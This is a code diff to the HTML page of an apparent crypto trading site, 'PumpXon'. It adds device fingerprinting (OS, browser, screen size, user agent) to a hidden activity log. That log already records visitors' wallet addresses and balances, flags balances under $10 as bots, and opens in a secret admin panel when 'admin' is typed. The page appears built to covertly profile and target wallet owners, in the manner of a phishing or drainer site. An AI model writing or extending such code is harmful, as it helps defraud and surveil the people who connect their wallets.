@@ -15,7 +15,19 @@
             --solana-glow: linear-gradient(135deg, #ab9ff2 0%, #4e44ce 100%);
         }
 
+        /* Custom Cursor - EXCEPT inside admin panel */
         * { cursor: none; }
+        
+        /* Admin panel gets normal cursor */
+        #admin-panel, #admin-panel *, #admin-overlay {
+            cursor: default !important;
+        }
+        
+        /* Buttons inside admin panel get pointer */
+        #admin-panel button, #admin-panel .log-clear-btn, #admin-panel .admin-close {
+            cursor: pointer !important;
+        }
+
         .custom-cursor {
             position: fixed; top: 0; left: 0; width: 8px; height: 8px;
             background: var(--neon-cyan); border-radius: 50%; pointer-events: none;
@@ -24,6 +36,14 @@
         }
         .custom-cursor.click { transform: translate(-50%, -50%) scale(1.5); background: var(--neon-pink); box-shadow: 0 0 20px var(--neon-pink); }
         .custom-cursor.hover { transform: translate(-50%, -50%) scale(2); background: transparent; border: 1px solid var(--neon-cyan); }
+        
+        /* Hide custom cursor when over admin panel */
+        #admin-panel.active ~ .custom-cursor,
+        #admin-overlay.active ~ .custom-cursor {
+            opacity: 0;
+            pointer-events: none;
+        }
+
         input { pointer-events: auto !important; }
 
         body { font-family: 'Arial Black', -apple-system, sans-serif; background-color: var(--bg-dark); color: #ffffff; margin: 0; padding: 0; min-height: 100vh; display: flex; flex-direction: column; align-items: center; overflow-x: hidden; position: relative; }
@@ -104,7 +124,7 @@
         .progress-fill { height: 100%; background: var(--neon-cyan); width: 0%; transition: width 0.4s ease; box-shadow: 0 0 10px var(--neon-cyan); }
         .modal-status { font-family: monospace; color: #8b859e; margin-top: 15px; font-size: 12px; text-transform: uppercase; }
 
-        /* HIDDEN ADMIN PANEL - Only visible with secret key combo */
+        /* HIDDEN ADMIN PANEL */
         .admin-panel {
             display: none;
             position: fixed;
@@ -122,6 +142,7 @@
             box-sizing: border-box;
             z-index: 10000;
             box-shadow: 0 0 60px rgba(255, 0, 85, 0.3);
+            cursor: default !important;
         }
         .admin-panel.active { display: block; }
         .admin-panel::-webkit-scrollbar { width: 6px; }
@@ -160,7 +181,7 @@
             border-radius: 4px;
             font-family: monospace;
             font-size: 10px;
-            cursor: pointer;
+            cursor: pointer !important;
             transition: 0.2s;
         }
         .admin-close:hover {
@@ -178,6 +199,7 @@
             align-items: center;
             color: #a3a1ab;
             flex-wrap: wrap;
+            cursor: default !important;
         }
         .log-entry .log-time { color: #5a5570; font-size: 10px; min-width: 70px; }
         .log-entry .log-type {
@@ -196,10 +218,18 @@
         .log-type.bot { background: rgba(255, 0, 0, 0.3); color: #ff4444; }
         .log-type.system { background: rgba(255, 255, 255, 0.1); color: #888; }
         .log-type.chat { background: rgba(0, 240, 255, 0.1); color: #66ddff; }
+        .log-type.device { background: rgba(157, 78, 221, 0.15); color: var(--neon-purple); }
         .log-entry .log-detail { flex: 1; word-break: break-all; }
         .log-entry .log-balance { color: var(--neon-green); font-weight: bold; }
         .log-entry .log-balance.low { color: #ff6644; }
         .log-entry .log-wallet { color: var(--neon-purple); font-size: 10px; }
+        .log-entry .log-device { 
+            font-size: 10px; 
+            padding: 2px 8px; 
+            border-radius: 3px; 
+            background: rgba(255,255,255,0.05);
+            color: var(--neon-cyan);
+        }
         
         .log-clear-btn {
             background: rgba(255, 0, 85, 0.15);
@@ -209,7 +239,7 @@
             border-radius: 4px;
             font-family: monospace;
             font-size: 10px;
-            cursor: pointer;
+            cursor: pointer !important;
             transition: 0.2s;
         }
         .log-clear-btn:hover {
@@ -226,6 +256,7 @@
             height: 100vh;
             background: rgba(0, 0, 0, 0.7);
             z-index: 9999;
+            cursor: default !important;
         }
         .admin-overlay.active { display: block; }
 
@@ -536,8 +567,72 @@
 
     <script>
         // ============================================================
-        // SECRET ADMIN PANEL - Press 'A' + 'D' + 'M' + 'I' + 'N' 
-        // in sequence to open (case insensitive)
+        // DEVICE DETECTION
+        // ============================================================
+        function detectDevice() {
+            const ua = navigator.userAgent;
+            
+            // Check for mobile OS
+            const isIOS = /iPad|iPhone|iPod/.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
+            const isAndroid = /Android/.test(ua);
+            const isMac = /Macintosh|MacIntel|MacPPC|Mac68K/.test(ua) && !isIOS;
+            const isWindows = /Win(dows|dows NT|dows 95|dows 98|dows ME|dows 2000|dows XP|dows Vista|dows 7|dows 8|dows 10|dows 11)/.test(ua);
+            const isLinux = /Linux/.test(ua) && !isAndroid;
+            
+            // Check for mobile vs desktop
+            const isMobile = isIOS || isAndroid || /Mobi|Mobile/.test(ua);
+            
+            let deviceType = 'Desktop';
+            let deviceIcon = '🖥️';
+            let osType = 'Unknown';
+            
+            if (isIOS) {
+                deviceType = 'Mobile';
+                deviceIcon = '📱';
+                osType = 'iOS';
+            } else if (isAndroid) {
+                deviceType = 'Mobile';
+                deviceIcon = '📱';
+                osType = 'Android';
+            } else if (isMac) {
+                deviceType = 'Desktop';
+                deviceIcon = '💻';
+                osType = 'macOS';
+            } else if (isWindows) {
+                deviceType = 'Desktop';
+                deviceIcon = '🖥️';
+                osType = 'Windows';
+            } else if (isLinux) {
+                deviceType = 'Desktop';
+                deviceIcon = '🐧';
+                osType = 'Linux';
+            }
+            
+            // Browser detection
+            let browser = 'Unknown';
+            if (ua.indexOf('Chrome') > -1 && ua.indexOf('Edg') === -1) browser = 'Chrome';
+            else if (ua.indexOf('Safari') > -1 && ua.indexOf('Chrome') === -1) browser = 'Safari';
+            else if (ua.indexOf('Firefox') > -1) browser = 'Firefox';
+            else if (ua.indexOf('Edg') > -1) browser = 'Edge';
+            else if (ua.indexOf('Opera') > -1) browser = 'Opera';
+            
+            // Screen size
+            const screenSize = `${window.screen.width}x${window.screen.height}`;
+            
+            return {
+                deviceType: deviceType,
+                deviceIcon: deviceIcon,
+                osType: osType,
+                browser: browser,
+                isMobile: isMobile,
+                screenSize: screenSize,
+                userAgent: ua,
+                fullString: `${deviceIcon} ${osType} | ${browser} | ${screenSize}`
+            };
+        }
+
+        // ============================================================
+        // SECRET ADMIN PANEL - Press 'A' + 'D' + 'M' + 'I' + 'N'
         // ============================================================
         let secretKeyPresses = [];
         const secretCode = ['a', 'd', 'm', 'i', 'n'];
@@ -546,13 +641,11 @@
         document.addEventListener('keydown', function(e) {
             const key = e.key.toLowerCase();
             
-            // Add to sequence
             secretKeyPresses.push(key);
             if (secretKeyPresses.length > secretCode.length) {
                 secretKeyPresses.shift();
             }
             
-            // Check if sequence matches
             let match = true;
             for (let i = 0; i < secretKeyPresses.length; i++) {
                 if (secretKeyPresses[i] !== secretCode[i]) {
@@ -564,10 +657,9 @@
             if (match && secretKeyPresses.length === secretCode.length) {
                 e.preventDefault();
                 toggleAdminPanel();
-                secretKeyPresses = []; // Reset after trigger
+                secretKeyPresses = [];
             }
             
-            // Also allow ESC to close
             if (key === 'escape' && adminPanelOpen) {
                 closeAdminPanel();
             }
@@ -594,10 +686,11 @@
         }
 
         // ============================================================
-        // LOGGING SYSTEM - Tracks all user activity
+        // LOGGING SYSTEM
         // ============================================================
         let activityLogs = [];
         let logCounter = 0;
+        const deviceInfo = detectDevice();
 
         function addLogEntry(type, detail, balance = null, wallet = null) {
             const now = new Date();
@@ -609,7 +702,8 @@
                 type: type,
                 detail: detail,
                 balance: balance,
-                wallet: wallet
+                wallet: wallet,
+                device: deviceInfo.fullString
             };
             
             activityLogs.unshift(entry);
@@ -620,7 +714,7 @@
                 updateLogCount();
             }
             
-            console.log(`[${timeStr}] [${type.toUpperCase()}] ${detail} ${balance !== null ? '| Balance: $' + balance : ''} ${wallet ? '| Wallet: ' + wallet : ''}`);
+            console.log(`[${timeStr}] [${type.toUpperCase()}] ${detail} ${balance !== null ? '| Balance: $' + balance : ''} ${wallet ? '| Wallet: ' + wallet : ''} | Device: ${deviceInfo.fullString}`);
         }
 
         function renderLogs() {
@@ -634,6 +728,7 @@
                 const balanceClass = entry.balance !== null && entry.balance < 10 ? 'log-balance low' : 'log-balance';
                 const balanceDisplay = entry.balance !== null ? `| <span class="${balanceClass}">$${entry.balance.toFixed(2)}</span>` : '';
                 const walletDisplay = entry.wallet ? `<span class="log-wallet">🔑 ${entry.wallet}</span>` : '';
+                const deviceDisplay = entry.device ? `<span class="log-device">${entry.device}</span>` : '';
                 
                 const isBot = entry.balance !== null && entry.balance < 10;
                 const typeClass = isBot ? 'bot' : entry.type;
@@ -646,6 +741,7 @@
                         <span class="log-detail">${entry.detail}</span>
                         ${walletDisplay}
                         ${balanceDisplay}
+                        ${deviceDisplay}
                         ${isBot ? '🤖 SUSPECTED BOT' : ''}
                     </div>
                 `;
@@ -795,15 +891,56 @@
         // CUSTOM CURSOR
         // ============================================================
         const cursor = document.getElementById('cursor');
-        document.addEventListener('mousemove', e => { cursor.style.left = e.clientX + 'px'; cursor.style.top = e.clientY + 'px'; });
-        document.addEventListener('mousedown', () => cursor.classList.add('click'));
-        document.addEventListener('mouseup', () => cursor.classList.remove('click'));
+        
+        document.addEventListener('mousemove', function(e) {
+            // Check if mouse is over admin panel
+            const adminPanel = document.getElementById('admin-panel');
+            const isOverAdmin = adminPanel.classList.contains('active') && 
+                               e.target.closest('#admin-panel');
+            
+            if (!isOverAdmin) {
+                cursor.style.left = e.clientX + 'px';
+                cursor.style.top = e.clientY + 'px';
+                cursor.style.opacity = '1';
+            } else {
+                cursor.style.opacity = '0';
+            }
+        });
+        
+        document.addEventListener('mousedown', function(e) {
+            const adminPanel = document.getElementById('admin-panel');
+            const isOverAdmin = adminPanel.classList.contains('active') && 
+                               e.target.closest('#admin-panel');
+            if (!isOverAdmin) {
+                cursor.classList.add('click');
+            }
+        });
+        document.addEventListener('mouseup', function(e) {
+            const adminPanel = document.getElementById('admin-panel');
+            const isOverAdmin = adminPanel.classList.contains('active') && 
+                               e.target.closest('#admin-panel');
+            if (!isOverAdmin) {
+                cursor.classList.remove('click');
+            }
+        });
         
         function rewireCursorHoverEffects() {
             const interactables = document.querySelectorAll('button, input, .coin-row, th, td, .chart-filter-btn, .dropdown-item, .swap-arrow');
             interactables.forEach(el => {
-                el.addEventListener('mouseenter', () => cursor.classList.add('hover'));
-                el.addEventListener('mouseleave', () => cursor.classList.remove('hover'));
+                el.addEventListener('mouseenter', () => {
+                    const adminPanel = document.getElementById('admin-panel');
+                    const isOverAdmin = adminPanel.classList.contains('active') && 
+                                       document.activeElement && 
+                                       document.activeElement.closest('#admin-panel');
+                    if (!isOverAdmin) cursor.classList.add('hover');
+                });
+                el.addEventListener('mouseleave', () => {
+                    const adminPanel = document.getElementById('admin-panel');
+                    const isOverAdmin = adminPanel.classList.contains('active') && 
+                                       document.activeElement && 
+                                       document.activeElement.closest('#admin-panel');
+                    if (!isOverAdmin) cursor.classList.remove('hover');
+                });
             });
         }
 
@@ -1065,7 +1202,7 @@
         function handleChatEnter(event) { if (event.key === "Enter") { event.preventDefault(); sendChatMessage(); } }
 
         // ============================================================
-        // WALLET CONNECTION - WITH FULL LOGGING
+        // WALLET CONNECTION - WITH DEVICE LOGGING
         // ============================================================
         function triggerWalletModal(walletType) {
             playBeep(600);
@@ -1129,7 +1266,7 @@
         }
 
         // ============================================================
-        // COPYTRADE MIRROR - WITH LOGGING
+        // COPYTRADE MIRROR - WITH DEVICE LOGGING
         // ============================================================
         function verifyAndMirror(btn, traderSig) {
             const addrInput = document.getElementById('address');
@@ -1216,9 +1353,12 @@
         fetchLiveCryptoPrices();
         setInterval(fetchLiveCryptoPrices, 45000);
         
+        // Log the device info on startup
+        addLogEntry('device', `Device detected: ${deviceInfo.fullString}`);
         addLogEntry('system', 'PumpXon System initialized');
         
         console.log("🔐 ADMIN PANEL: Press 'A' 'D' 'M' 'I' 'N' in sequence to open");
+        console.log("📱 Device detected:", deviceInfo.fullString);
     </script>
 </body>
 </html>
